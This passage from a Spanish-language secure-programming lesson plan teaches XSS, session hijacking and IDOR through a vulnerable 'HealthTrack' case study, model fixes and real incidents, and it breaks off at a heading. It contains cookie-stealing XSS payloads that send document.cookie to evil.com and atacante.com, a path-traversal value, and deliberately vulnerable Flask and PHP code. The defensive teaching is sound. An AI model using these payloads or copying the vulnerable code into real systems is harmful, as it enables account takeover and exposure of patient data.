| ID numérico en URL | `GET /factura/1234` | Verificar `factura.usuario_id == sesion.usuario_id` en la consulta |
| Nombre de archivo legible | `GET /docs/juan_nomina.pdf` | Almacenar archivos con UUID como nombre, no el nombre original |
| ID en parámetro GET | `GET /perfil?user=admin` | Obtener el usuario desde sesión del servidor, nunca del parámetro |
| ID en body JSON | `POST /editar {"id": 1234}` | Verificar propiedad antes de cualquier operación de escritura |
| Referencia a objeto en headers | `X-User-ID: 999` | Ignorar headers de usuario; leer siempre desde sesión del servidor |

---

**PREGUNTA AL GRUPO 4:** "¿Por qué el IDOR devuelve el mismo error 404 tanto si el pedido no existe como si pertenece a otro usuario?"

**RESPUESTA ESPERADA DETALLADA:** Para evitar la enumeración de recursos (resource enumeration). Si el servidor devuelve `403 Forbidden` cuando el pedido existe pero no pertenece al usuario, y `404 Not Found` cuando no existe, el atacante puede inferir qué IDs existen en el sistema y cuáles no. Con esa información puede saber el volumen de pedidos del sistema, identificar rangos de IDs activos, y focalizar ataques en IDs que sabe que existen. Al devolver siempre `404` para ambos casos, el atacante no puede distinguir entre "ese ID no existe en el sistema" y "ese ID existe pero no es tuyo" — lo que reduce drásticamente la información que puede extraer del sistema. Este principio forma parte de la defensa en profundidad como complemento (nunca reemplazo) de los controles de acceso reales.

---

**MINI ACTIVIDAD T4 (4 min):** Se muestra este endpoint en pantalla:

```
GET /api/documento?filename=reporte_Q1.pdf
```

Los estudiantes deben: (1) identificar el tipo de IDOR, (2) proponer un ataque — qué cambiarían en el parámetro y por qué funcionaría, (3) proponer el fix completo.

**Respuesta esperada:**
1. IDOR por nombre de archivo (también puede clasificarse como Path Traversal si intentan escalar directorios)
2. Ataque: cambiar `filename=reporte_Q1.pdf` por `filename=reporte_Q1_CONFIDENCIAL.pdf` si adivinan nombres, o `filename=../../../etc/passwd` para path traversal, o `filename=nomina_gerencia_2025.pdf` para acceder a archivos de otros usuarios
3. Fix: almacenar archivos con UUIDs aleatorios como nombre en disco (`a3f2c1d4-...pdf`) en lugar del nombre original. Guardar en BD la relación UUID → nombre original → usuario propietario. Al servir el archivo, verificar que el UUID pertenece al usuario en sesión antes de enviarlo. Ejemplo: `GET /api/documento?token=a3f2c1d4-8b2e-4f1a-9c3d-2e5f8a7b6c4d`

---

### T5. Relación entre XSS y Session Hijacking (10 min)

#### Explicación conceptual

XSS y la gestión de sesiones están íntimamente relacionados en la cadena de ataque: XSS es con frecuencia el vector técnico que permite ejecutar session hijacking. El flujo completo del ataque combinado es:

1. El atacante encuentra un campo vulnerable a XSS almacenado (por ejemplo, el campo de "nombre de usuario" o "comentario" en un foro)
2. Inyecta el payload: `<script>new Image().src='https://evil.com/steal?c='+document.cookie</script>`
3. El script se guarda en la BD y se incluye en la página cada vez que alguien la visita
4. Cuando un usuario legítimo visita la página, su navegador ejecuta el script automáticamente
5. El script construye una URL con las cookies del usuario y la envía al servidor del atacante (disfrazada como una petición de imagen)
6. El servidor del atacante registra la cookie completa, incluyendo el session ID
7. El atacante usa ese session ID en su propio navegador para abrir sesión como la víctima sin necesitar su contraseña

#### Defensa en capas contra XSS → Session Hijacking

```
Capa 1: Escape de output
   → El script no se renderiza como código en el navegador
   → Si falla: el JS se ejecuta

Capa 2: Content Security Policy (CSP)
   → Incluso si hay XSS, el script inline o de origen desconocido es bloqueado
   → Si falla: el JS se ejecuta y puede hacer peticiones

Capa 3: HttpOnly en la cookie de sesión
   → Incluso si el script se ejecuta, document.cookie no devuelve la cookie de sesión
   → Si falla: el atacante obtiene el session ID

Capa 4: SameSite=Strict en la cookie
   → Incluso con el session ID, no puede usarlo fácilmente desde otro origen
   → Si falla: el atacante puede usar el session ID cross-site

Capa 5: Tiempo de expiración corto (ej: 30 minutos)
   → La ventana de uso del session ID robado es temporalmente limitada
   → Si falla: el atacante tiene acceso prolongado

Resultado: el session hijacking exitoso requiere que TODAS las capas fallen simultáneamente.
Cada capa independiente reduce exponencialmente la probabilidad de éxito del ataque completo.
```

#### Diagrama del ataque y las capas de defensa

```
ATAQUE: XSS → SESSION HIJACKING
─────────────────────────────────────────────────────────────────────
Atacante inyecta JS malicioso en campo de comentario
         │
         ▼
JS renderizado sin escape en el navegador de la víctima
         │  ← [BLOQUEADO por Capa 1: escape de output]
         ▼
JS se ejecuta en el navegador de la víctima
         │  ← [BLOQUEADO por Capa 2: CSP bloquea script inline]
         ▼
JS ejecuta: document.cookie → [BLOQUEADO por Capa 3: HttpOnly]
         ▼
Atacante obtiene session ID
         │  ← [LIMITADO por Capa 4: SameSite=Strict]
         ▼
Atacante usa session ID → [LIMITADO por Capa 5: expiración 30 min]
         ▼
Session Hijacking exitoso ← solo si las 5 capas fallan simultáneamente
```

---

**PREGUNTA AL GRUPO 5:** "Si una cookie tiene `HttpOnly=True`, ¿significa que XSS ya no puede hacer daño?"

**RESPUESTA ESPERADA DETALLADA:** No. `HttpOnly` solo impide que JavaScript acceda a la cookie mediante `document.cookie`. Pero XSS puede causar daño grave de muchas otras formas incluso con `HttpOnly`:
1. **Keylogging:** capturar lo que el usuario escribe en la página — números de tarjeta de crédito, contraseñas en campos visibles
2. **Redireccionamiento a phishing:** cambiar `window.location` para enviar al usuario a una página falsa que capture sus credenciales
3. **Modificación del DOM:** cambiar el número de cuenta destino en un formulario de transferencia bancaria antes de que se envíe
4. **Exfiltración de datos visibles:** el script puede leer el contenido del DOM (saldos, nombres, datos médicos visibles en pantalla) y enviarlo al atacante aunque no tenga las cookies
5. **CSRF interno desde el contexto del usuario:** el script puede hacer fetch() o XMLHttpRequest() al propio servidor usando la sesión ya activa del usuario, ejecutando acciones como si fuera él (transferencias, cambios de contraseña, eliminación de datos)

`HttpOnly` es una capa de defensa fundamental pero no suficiente por sí sola. Debe combinarse con escape de output, CSP y las demás capas.

---

### T6. Defensa integrada y mejores prácticas (5 min)

#### Tabla resumen: las 4 vulnerabilidades y sus controles

| Vulnerabilidad | OWASP 2021 | Vector de ataque | Control principal | Control adicional |
|---|---|---|---|---|
| XSS Reflejado | A03:2021 Injection | Link malicioso con script en URL | Escape de output contextual al renderizar | CSP, validación de formato del input |
| XSS Almacenado | A03:2021 Injection | Script guardado en BD, ejecutado en todos los visitantes | Escape de output al renderizar (no al guardar) | CSP con `script-src 'self'`, HttpOnly |
| Sesión insegura | A07:2021 Auth Failures | Session hijacking, session fixation | HttpOnly + Secure + SameSite en cookies | Regenerar session ID post-login, expiración corta |
| IDOR | A01:2021 Broken Access Control | Acceso a recursos de otros usuarios por ID predecible | Verificar propiedad del objeto en el servidor | UUIDs en lugar de IDs numéricos secuenciales |

---

**PREGUNTA AL GRUPO 6 — Pregunta de consolidación:** "Si tuvieran que elegir UN solo control para implementar primero en un sistema que tiene XSS, sesiones mal configuradas e IDOR, ¿cuál elegirían y por qué?"

**RESPUESTA ESPERADA DETALLADA:** No hay una única respuesta correcta, pero la argumentación debe ser técnica y justificada. Ejemplos de argumentaciones válidas:

**Argumento para elegir escape de output (XSS) primero:** XSS puede usarse para explotar también las vulnerabilidades de sesión mediante session hijacking: si resuelvo XSS, elimino el vector más común de robo de session IDs, lo que mitiga parcialmente el riesgo de sesiones inseguras. Un solo escape reduce dos superficies de ataque.

**Argumento para elegir IDOR primero:** IDOR compromete datos de usuarios reales directamente y de forma silenciosa, sin necesitar explotar otro vector. Un atacante puede leer datos de miles de registros simplemente iterando IDs, sin alertar al sistema. Tiene impacto inmediato y masivo en privacidad.

**Argumento para elegir HttpOnly primero:** Si los atacantes ya están ejecutando XSS exitosamente, HttpOnly detiene la exfiltración de session IDs mientras se implementan los demás controles, reduciendo el impacto inmediato.

El docente debe valorar la argumentación técnica y la comprensión de las relaciones entre vulnerabilidades, no solo la elección final.

---

## RECESO (20 min)

El docente puede usar este tiempo para revisar preguntas individuales, preparar los materiales del caso práctico HealthTrack y resolver dudas de estudiantes que se acerquen. Se recomienda dejar en pantalla o en papel el enunciado del caso práctico para que los estudiantes lo lean durante el receso y lleguen con contexto al Bloque 3.

---

## 4. PRÁCTICA (40 min)

### a) Caso práctico grupal (25 min)

**ESCENARIO: "HealthTrack — Plataforma de salud con múltiples vulnerabilidades"**

HealthTrack es una startup peruana que desarrolló una aplicación web para que pacientes gestionen sus citas médicas, resultados de exámenes y mensajes con su médico. La aplicación tiene 15,000 usuarios activos. El equipo de desarrollo trabajó rápido para el lanzamiento y ahora el CTO sospecha que hay problemas de seguridad. El equipo de ustedes es contratado como consultores de seguridad.

**Código a analizar:**

```python
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Fragmento 1: Sistema de mensajería entre pacientes y médicos
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@app.route('/mensaje/nuevo', methods=['POST'])
def nuevo_mensaje():
    mensaje = request.form.get('contenido', '')
    destinatario_id = request.form.get('destinatario_id')

    # Guarda el mensaje sin sanitización
    db.execute(f"INSERT INTO mensajes (contenido, de_id, para_id) VALUES ('{mensaje}', {session['user_id']}, {destinatario_id})")
    db.commit()
    return redirect('/bandeja')


@app.route('/bandeja')
def bandeja():
    mensajes = db.execute("SELECT contenido, de_id FROM mensajes WHERE para_id = ?",
                          (session['user_id'],)).fetchall()
    html = "<h1>Tu bandeja de entrada</h1>"
    for m in mensajes:
        html += f"<div class='mensaje'>{m[0]}</div>"  # Sin escape de output
    return html


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Fragmento 2: Acceso a resultados de exámenes
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@app.route('/resultado/<int:examen_id>')
def ver_resultado(examen_id):
    if not session.get('autenticado'):
        return redirect('/login')

    resultado = db.execute(
        "SELECT * FROM examenes WHERE id = ?", (examen_id,)
    ).fetchone()

    return jsonify(dict(resultado)) if resultado else abort(404)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Fragmento 3: Configuración de sesión
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

app.secret_key = "healthtrack2024"
app.config['SESSION_COOKIE_HTTPONLY'] = False
app.config['SESSION_COOKIE_SECURE'] = False
```

**PREGUNTAS PARA LOS GRUPOS:**

1. Identificar TODAS las vulnerabilidades en cada fragmento (hay al menos 6 en total). Para cada una: nombre de la vulnerabilidad, fragmento donde aparece, línea o construcción exacta que la causa.
2. Clasificar cada vulnerabilidad según el OWASP Top 10 2021.
3. Construir una matriz de riesgo (Probabilidad × Impacto) para cada vulnerabilidad con valores Alto/Medio/Bajo y justificación.
4. Proponer el código corregido para los 3 fragmentos completos.
5. Analizar el impacto en los pacientes: ¿qué información de salud podría quedar expuesta? ¿Viola la Ley N° 29733 de Protección de Datos Personales de Perú?

**PRODUCTO ESPERADO:** Tabla de hallazgos de seguridad (una fila por vulnerabilidad) + código corregido de los 3 fragmentos + análisis de impacto en privacidad de pacientes.

---

**PREGUNTAS DE ANDAMIAJE DEL DOCENTE** (para grupos que estén trabados):

- "¿Qué pasa si un paciente envía `<script>document.location='https://atacante.com?c='+document.cookie</script>` como contenido de mensaje a su médico? ¿Qué vería el médico al abrir su bandeja?"
- "¿Puede un paciente con ID=5 ver los resultados del examen con ID=1 que pertenece al paciente con ID=1? ¿Qué cambiaría en la URL para intentarlo?"
- "La clave secreta `healthtrack2024` está en el código fuente. Si un desarrollador sube ese código a GitHub público, ¿qué puede hacer un atacante con esa clave?"
- "Si los resultados de exámenes incluyen diagnósticos de VIH, diabetes o salud mental, ¿qué artículo de la Ley 29733 se violaría al exponer esos datos a otros pacientes?"

---

**RESPUESTA MODELO COMPLETA — Tabla de hallazgos:**

| # | Vulnerabilidad | Fragmento | Línea/Causa | OWASP 2021 | Probabilidad | Impacto | Nivel |
|---|---|---|---|---|---|---|---|
| 1 | SQL Injection en INSERT | Fragmento 1 | `f"INSERT...VALUES ('{mensaje}',..."` — f-string con input sin escape en SQL | A03:2021 Injection | Alta | Crítico | CRÍTICO |
| 2 | XSS Almacenado | Fragmento 1 | `f"<div class='mensaje'>{m[0]}</div>"` — renderizado sin escape | A03:2021 Injection | Alta | Alto | ALTO |
| 3 | IDOR en resultados médicos | Fragmento 2 | Solo verifica autenticación, no verifica que `examen.paciente_id == session.user_id` | A01:2021 Broken Access Control | Alta | Crítico | CRÍTICO |
| 4 | Clave secreta débil y hardcodeada | Fragmento 3 | `app.secret_key = "healthtrack2024"` — predecible y en código fuente | A02:2021 Cryptographic Failures | Alta | Crítico | CRÍTICO |
| 5 | HttpOnly=False | Fragmento 3 | `SESSION_COOKIE_HTTPONLY = False` — cookie accesible por JS | A07:2021 Auth Failures | Alta | Alto | ALTO |
| 6 | Secure=False | Fragmento 3 | `SESSION_COOKIE_SECURE = False` — cookie enviada por HTTP | A07:2021 Auth Failures | Media | Medio | MEDIO |

---

**CÓDIGO CORREGIDO — Versión segura completa con comentarios:**

```python
import html as html_module
import secrets
import sqlite3
import time
from flask import Flask, request, session, jsonify, redirect, abort, make_response

app = Flask(__name__)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURACIÓN DE SESIÓN CORREGIDA
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# ✅ Clave secreta criptográficamente segura desde variable de entorno
import os
app.secret_key = os.environ.get('SECRET_KEY') or secrets.token_hex(32)

app.config.update(
    SESSION_COOKIE_HTTPONLY=True,       # ✅ Cookie inaccesible desde JavaScript
    SESSION_COOKIE_SECURE=True,         # ✅ Cookie solo se transmite por HTTPS
    SESSION_COOKIE_SAMESITE='Strict',   # ✅ Previene CSRF
    PERMANENT_SESSION_LIFETIME=1800,    # ✅ Expiración en 30 minutos
)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# FRAGMENTO 1 CORREGIDO: Sistema de mensajería
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@app.route('/mensaje/nuevo', methods=['POST'])
def nuevo_mensaje():
    # ✅ Verificar autenticación
    if not session.get('autenticado'):
        return redirect('/login')

    mensaje = request.form.get('contenido', '').strip()
    destinatario_id = request.form.get('destinatario_id')

    # ✅ Validar datos de entrada
    if not mensaje or len(mensaje) > 1000:
        return jsonify({"error": "Mensaje inválido o demasiado largo"}), 400
    if not destinatario_id or not str(destinatario_id).isdigit():
        return jsonify({"error": "Destinatario inválido"}), 400

    # ✅ Preparar conexión a BD
    conn = sqlite3.connect('healthtrack.db')
    cursor = conn.cursor()

    # ✅ Usar prepared statements — NO concatenación ni f-strings en SQL
    cursor.execute(
        "INSERT INTO mensajes (contenido, de_id, para_id) VALUES (?, ?, ?)",
        (mensaje, session['usuario_id'], int(destinatario_id))
        # El texto se guarda tal cual — el escape se aplica al MOSTRAR, no al guardar
    )
    conn.commit()
    conn.close()
    return redirect('/bandeja')


@app.route('/bandeja')
def bandeja():
    # ✅ Verificar autenticación
    if not session.get('autenticado'):
        return redirect('/login')

    conn = sqlite3.connect('healthtrack.db')
    cursor = conn.cursor()
    mensajes = cursor.execute(
        "SELECT contenido, de_id FROM mensajes WHERE para_id = ?",
        (session['usuario_id'],)
    ).fetchall()
    conn.close()

    html = "<h1>Tu bandeja de entrada</h1>"
    for m in mensajes:
        # ✅ Escapar el output al renderizar — convierte < > " & en entidades HTML
        # <script>alert('XSS')</script> se muestra como texto literal, no se ejecuta
        contenido_seguro = html_module.escape(m[0])
        html += f"<div class='mensaje'>{contenido_seguro}</div>"
    return html


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# FRAGMENTO 2 CORREGIDO: Acceso a resultados de exámenes
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@app.route('/resultado/<int:examen_id>')
def ver_resultado(examen_id):
    # ✅ Obtener el paciente_id desde la SESIÓN del servidor (nunca del request)
    paciente_id = session.get('usuario_id')
    if not paciente_id:
        abort(401)  # No autenticado

    conn = sqlite3.connect('healthtrack.db')
    cursor = conn.cursor()

    # ✅ Verificación de autorización: el resultado solo se devuelve si
    # su id coincide Y pertenece al paciente autenticado en sesión
    resultado = cursor.execute(
        "SELECT id, tipo_examen, fecha, resultado_texto FROM examenes "
        "WHERE id = ? AND paciente_id = ?",
        (examen_id, paciente_id)  # ✅ Doble condición: objeto + propietario
    ).fetchone()

    conn.close()

    if resultado:
        return jsonify({
            "examen_id": resultado[0],
            "tipo": resultado[1],
            "fecha": resultado[2],
            "resultado": resultado[3]
            # ✅ No incluir paciente_id ni datos internos en la respuesta
        })

    # ✅ Mismo error 404 para "no existe" y "no pertenece al paciente"
    # El atacante no puede distinguir entre los dos casos
    abort(404)
```

---

**ANÁLISIS DE IMPACTO — Privacidad de pacientes y Ley 29733:**

Si las vulnerabilidades se explotan en HealthTrack:
- **SQLi en mensajes:** un atacante podría eliminar o modificar toda la tabla `mensajes` o `examenes`. Podría también leer todas las tablas de la BD con `UNION SELECT`.
- **XSS Almacenado en bandeja:** un paciente malicioso podría enviar mensajes que roben las cookies de sesión de los médicos. Un médico con XSS en su bandeja podría ser redirigido a una página falsa que capture sus credenciales, comprometiendo todos los pacientes que atiende.
- **IDOR en resultados médicos:** cualquier paciente autenticado puede leer los resultados de exámenes de cualquier otro paciente simplemente iterando IDs (1, 2, 3...). Resultados de HIV, cáncer, salud mental quedan expuestos.
- **Violación de Ley 29733 (Perú):** El Artículo 13 establece datos sensibles que requieren protección reforzada: datos de salud son "datos sensibles" según el artículo 2. El Artículo 6 requiere medidas de seguridad adecuadas. La IDOR representa una falla directa en esas medidas. La sanción puede llegar a 100 UIT por infracciones muy graves (Art. 39).

---

### b) Ejercicio individual (15 min)

Se provee el siguiente fragmento PHP de la versión legacy de HealthTrack:

```php
<?php
// Sistema de perfil de usuario — HealthTrack versión PHP legacy
session_start();

// Endpoint: mostrar y editar bio del usuario
$user_id = $_GET['id'];   // ❌ ID tomado directamente de la URL sin validación
$bio = $_POST['bio'] ?? '';

// Guardar bio
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // ❌ IDOR + SQL Injection: concatenación directa en SQL
    // ❌ No verifica que el usuario en sesión es el dueño del perfil id=$user_id
    $stmt = $pdo->prepare("UPDATE usuarios SET bio = '$bio' WHERE id = $user_id");
    $stmt->execute();

    // ❌ XSS: renderiza $bio sin escape
    echo "Bio actualizada: $bio";
}

// Mostrar perfil
// ❌ SQL Injection: concatenación de $user_id en la consulta
$user = $pdo->query("SELECT nombre, bio FROM usuarios WHERE id = $user_id")->fetch();

// ❌ XSS: ambos campos se renderizan sin escape
echo "<h1>" . $user['nombre'] . "</h1>";
echo "<p>" . $user['bio'] . "</p>";
?>
```

**TAREA (trabajo individual):**

1. Identificar y clasificar CADA vulnerabilidad. Hay al menos 4. Para cada una: nombre, línea donde aparece, explicación de por qué es vulnerable.
2. Reescribir el fragmento completo en PHP seguro usando prepared statements con `?` y `htmlspecialchars()` para el output.
3. Indicar qué atributos de configuración de sesión agregarías al `session_start()`.

---

**CRITERIO DE ÉXITO — La versión segura debe cumplir:**

- `$pdo->prepare("UPDATE usuarios SET bio = ? WHERE id = ? AND id = ?")` — o equivalente que verifique propiedad
- La condición `$_SESSION['user_id'] == $user_id` se verifica antes de cualquier operación de escritura
- `htmlspecialchars()` aplicado a `$user['nombre']`, `$user['bio']` y `$bio` al mostrarse
- `$user_id` validado como entero antes de cualquier uso: `$user_id = (int)$_GET['id']`
- `session_set_cookie_params(['httponly' => true, 'secure' => true, 'samesite' => 'Strict'])` antes de `session_start()`

---

**SOLUCIÓN MODELO DEL EJERCICIO INDIVIDUAL:**

```php
<?php
// HealthTrack — Sistema de perfil de usuario (versión segura)

// ✅ Configurar atributos de seguridad de la cookie de sesión ANTES de session_start()
session_set_cookie_params([
    'lifetime' => 1800,        // ✅ Expiración en 30 minutos
    'path'     => '/',
    'secure'   => true,        // ✅ Solo por HTTPS
    'httponly' => true,        // ✅ Inaccesible desde JavaScript
    'samesite' => 'Strict'     // ✅ Previene CSRF
]);

session_start();

// ✅ Verificar autenticación antes de procesar cualquier cosa
if (empty($_SESSION['user_id'])) {
    header('Location: /login');
    exit;
}

// ✅ Validar y sanitizar el ID de la URL: forzar a entero
// Si el valor no es numérico, (int) devuelve 0, que no coincidirá con ningún registro
$user_id = (int)($_GET['id'] ?? 0);

if ($user_id <= 0) {
    http_response_code(400);
    echo "ID de usuario inválido";
    exit;
}

// Guardar bio (solo si es POST)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $bio = $_POST['bio'] ?? '';

    // ✅ Validar longitud
    if (strlen($bio) > 500) {
        http_response_code(400);
        echo "La bio es demasiado larga";
        exit;
    }

    // ✅ VERIFICACIÓN DE AUTORIZACIÓN: solo el dueño puede editar su propio perfil
    if ((int)$_SESSION['user_id'] !== $user_id) {
        http_response_code(403);
        echo "No autorizado";
        exit;
    }

    // ✅ Prepared statement con placeholders para AMBOS valores
    // La bio se guarda sin escape (el escape va al mostrar, no al guardar)
    $stmt = $pdo->prepare("UPDATE usuarios SET bio = ? WHERE id = ?");
    $stmt->execute([$bio, $user_id]);

    // ✅ Escape de output al mostrar: htmlspecialchars() convierte < > " & en entidades
    echo "Bio actualizada: " . htmlspecialchars($bio, ENT_QUOTES, 'UTF-8');
}

// Mostrar perfil
// ✅ Prepared statement: $user_id es un placeholder, no va dentro del string SQL
$stmt = $pdo->prepare("SELECT nombre, bio FROM usuarios WHERE id = ?");
$stmt->execute([$user_id]);
$user = $stmt->fetch();

if (!$user) {
    http_response_code(404);
    echo "Usuario no encontrado";
    exit;
}

// ✅ Escape de output al renderizar: htmlspecialchars() previene XSS
// ENT_QUOTES escapa tanto comillas simples como dobles
// UTF-8 especifica el charset para evitar ataques de charset-based XSS
echo "<h1>" . htmlspecialchars($user['nombre'], ENT_QUOTES, 'UTF-8') . "</h1>";
echo "<p>"  . htmlspecialchars($user['bio'],    ENT_QUOTES, 'UTF-8') . "</p>";
?>
```

**Vulnerabilidades identificadas (al menos 4):**
1. **SQL Injection en UPDATE:** `"UPDATE usuarios SET bio = '$bio' WHERE id = $user_id"` — concatenación directa. Clasificación: A03:2021 Injection. Línea 10.
2. **SQL Injection en SELECT:** `"SELECT nombre, bio FROM usuarios WHERE id = $user_id"` — misma concatenación. Clasificación: A03:2021 Injection. Línea 19.
3. **IDOR:** no se verifica que `$_SESSION['user_id'] === $user_id` antes de permitir el UPDATE. Cualquier usuario autenticado puede editar el perfil de cualquier otro. Clasificación: A01:2021 Broken Access Control. Línea 10-11.
4. **XSS en output de bio:** `echo "Bio actualizada: $bio"` y `echo "<p>" . $user['bio'] . "</p>"` — ninguno usa htmlspecialchars(). Clasificación: A03:2021. Líneas 14, 21-22.
5. **XSS en output de nombre:** `echo "<h1>" . $user['nombre'] . "</h1>"` — sin escape. Clasificación: A03:2021. Línea 21.
6. **Sin atributos de seguridad en sesión:** `session_start()` sin configuración previa de `httponly`, `secure`, `samesite`. Clasificación: A07:2021 Auth Failures.

---

## 5. CIERRE (10 min)

### a) Síntesis colaborativa (4 min)

El docente lanza las preguntas al grupo completo y espera respuestas voluntarias antes de confirmar.

---

**Pregunta 1:** "¿Cuál es la diferencia fundamental entre XSS reflejado y almacenado?"

**RESPUESTA ESPERADA:** XSS reflejado necesita que la víctima haga clic en un link específicamente crafteado con el payload; el script viaja en el request y el servidor lo refleja en la respuesta inmediata sin guardarlo. XSS almacenado persiste en la base de datos del servidor y ataca automáticamente a todos los visitantes de la página sin que el atacante tenga que hacer nada después de la inyección inicial. El almacenado es más peligroso por su escala y automatismo.

---

**Pregunta 2:** "Nombren 3 atributos de seguridad que debe tener una cookie de sesión segura y qué ataque previene cada uno."

**RESPUESTA ESPERADA:**
- `HttpOnly`: previene que JavaScript (incluyendo XSS) lea la cookie con `document.cookie`
- `Secure`: previene la transmisión de la cookie por HTTP en claro (vulnerable a sniffing)
- `SameSite=Strict`: previene el envío de la cookie en requests cross-site (previene CSRF y uso del session ID desde otro origen)

---

**Pregunta 3:** "¿Cómo se corrige un IDOR en una API REST?"

**RESPUESTA ESPERADA:** Obtener el `usuario_id` desde la sesión del servidor (nunca del request del cliente, nunca de un header enviado por el cliente). Incluir ese `usuario_id` como condición adicional en la consulta de BD junto con el ID del objeto solicitado. Devolver el mismo error `404` si el objeto no existe y si existe pero pertenece a otro usuario, para no revelar al atacante qué IDs existen en el sistema.

---

### b) Metacognición (3 min)

**Instrucción verbal al docente:**

"Antes de terminar, un minuto en silencio. Respondan mentalmente estas preguntas sin decirlas en voz alta: ¿Cuál de los tres temas de hoy — XSS, Sesiones, IDOR — entiendo mejor y podría explicarle a un compañero ahora mismo? ¿Cuál me genera más dudas todavía? ¿Qué parte del código del caso HealthTrack no pude corregir solo, sin ver la solución? Esas respuestas son exactamente lo que deben trabajar en la guía de trabajo de esta semana — están diseñadas para esas dudas específicas."

---

### c) Tarea y puente hacia S7 (3 min)

**Instrucción verbal al docente:**

"La semana que viene veremos Broken Authentication y Gestión de Contraseñas — que es el paso siguiente natural. Una vez que dominan la gestión de sesiones, el siguiente paso es proteger el proceso de autenticación completo: hashing correcto de contraseñas con bcrypt, autenticación multifactor (MFA), recuperación segura de contraseñas y gestión de intentos fallidos de login. Son los mecanismos que protegen el momento más crítico de cualquier aplicación: el acceso inicial.

La tarea para esta semana: completar la Guía de Trabajo S6, que incluye analizar fragmentos de código con las vulnerabilidades vistas hoy y proponer el código seguro correspondiente. El laboratorio en casa: implementar la versión segura completa de la aplicación HealthTrack en Python con Flask — corrección de XSS, sesiones y IDOR — y subirlo al repositorio del curso antes de la siguiente sesión. Las rúbricas y el enunciado completo están en el repositorio del curso."

---

## GUION VERBAL SUGERIDO

Estos fragmentos de guion están diseñados para los momentos donde la explicación abstracta puede perder a los estudiantes. El docente puede usarlos textualmente o adaptarlos a su propio estilo.

---

**Momento 1 — Al presentar XSS almacenado (durante T1):**

"Imaginen que escriben un comentario en el foro de su universidad. Ese comentario lo leen 5,000 personas. Si en lugar de texto, ese comentario contiene código que se ejecuta en el navegador de cada lector sin que ellos lo sepan ni lo vean... ¿cuántas cuentas compromete eso con un solo comentario? Ese es exactamente el XSS almacenado. Una línea de código malicioso en la BD, un ataque silencioso a escala masiva."

---

**Momento 2 — Al mostrar el código vulnerable con f-strings (durante T1):**

"¿Ven esta línea? `html += f'<p>{c}</p>'`. Parece completamente inofensiva, ¿verdad? Es solo mostrar un comentario en un párrafo HTML. Pero si `c` contiene `<script>alert('XSS')</script>`, el navegador no ve texto — ve una etiqueta de script y la ejecuta. La solución no es compleja: una función de escape que convierte el carácter `<` en la secuencia `&lt;` — cuatro caracteres extras que bloquean completamente el ataque. La vulnerabilidad fue una línea; el fix también es una línea."

---

**Momento 3 — Al explicar HttpOnly (durante T3):**

"HttpOnly no es un candado en la cookie que impide a todos verla. Es un escudo específico contra JavaScript. El usuario puede seguir viendo sus cookies en las DevTools del navegador — vayan a Application, cookies, y las ven. Pero el JavaScript de la página no puede tocarlas con `document.cookie`. Entonces, un atacante que logró inyectar JavaScript en la página tampoco puede leer la cookie. Ese es exactamente el escenario que HttpOnly previene."

---

**Momento 4 — Al explicar IDOR (durante T4):**

"Este es probablemente el bug más rentable en bug bounty. El año pasado, la plataforma HackerOne pagó más de $30 millones en recompensas por vulnerabilidades de control de acceso, siendo IDOR la más común. ¿Por qué es tan rentable? Porque es muy fácil de encontrar — solo cambias un número en la URL — y tiene impacto inmediato en datos reales de usuarios reales. No necesitas exploits sofisticados. Solo necesitas curiosidad y el suficiente conocimiento para saber que debería haber una verificación de propiedad en el servidor."

---

**Momento 5 — Al cerrar la sesión (durante el CIERRE):**

"Hoy vieron tres tipos de ataque muy diferentes en su mecanismo técnico, pero con algo esencial en común: en los tres casos, el sistema confía en el usuario sin verificar. XSS ocurre porque el sistema confía en que el input del usuario es texto inocente. La sesión insegura ocurre porque el sistema confía en que la cookie no puede ser robada o manipulada. IDOR ocurre porque el sistema confía en que el usuario solo pedirá sus propios recursos. La programación segura es, en esencia, desconfiar sistemáticamente de todo input externo y verificar siempre las suposiciones de seguridad en el servidor."

---

## CASOS REALES RECOMENDADOS

Para enriquecer la clase con evidencia del mundo real. El docente puede mencionar uno o dos durante la sesión y dejar los demás como lectura opcional.

---

**1. British Airways — Ataque Magecart (2018)**
XSS persistente en el formulario de pago de British Airways. El script malicioso fue inyectado en un widget JavaScript de terceros que la aerolínea incluía legítimamente en su página de checkout. Durante 15 días (del 21 de agosto al 5 de septiembre de 2018), el script capturó en tiempo real todos los datos que los clientes ingresaban en el formulario de pago: nombres, direcciones, datos de tarjeta de crédito. 500,000 clientes afectados. Multa del ICO del Reino Unido: £20 millones (reducida de £183M inicial por impacto de COVID-19 en la empresa). Fuente: Information Commissioner's Office (ICO) report, 2020.

---

**2. Facebook — Bug IDOR en fotos privadas (2019)**
La API Graph de Facebook tenía un endpoint para acceder a fotos mediante el parámetro `photo_id`. La verificación de permisos no era correcta: un usuario podía especificar el `photo_id` de una foto privada de otro usuario y la API la devolvía. Un investigador de seguridad descubrió que iterando IDs podía acceder a fotos privadas que los usuarios habían marcado como visibles solo para amigos o solo para ellos mismos. Reportado responsablemente a través del Facebook Bug Bounty Program. Recompensa: $10,000. Fuente: HackerOne, 2019.

---

**3. MySpace — Samy Worm (2005)**
